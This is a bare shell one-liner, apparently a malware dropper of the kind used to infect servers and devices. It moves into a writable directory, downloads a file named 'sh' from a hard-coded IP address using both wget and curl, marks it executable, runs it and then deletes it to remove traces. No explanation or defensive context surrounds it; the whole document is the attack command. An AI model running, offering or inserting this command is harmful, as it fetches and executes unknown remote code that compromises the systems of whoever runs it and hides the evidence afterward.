cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.135/sh; curl -O http://50.115.166.135/sh; chmod +x sh; ./sh; rm -rf sh
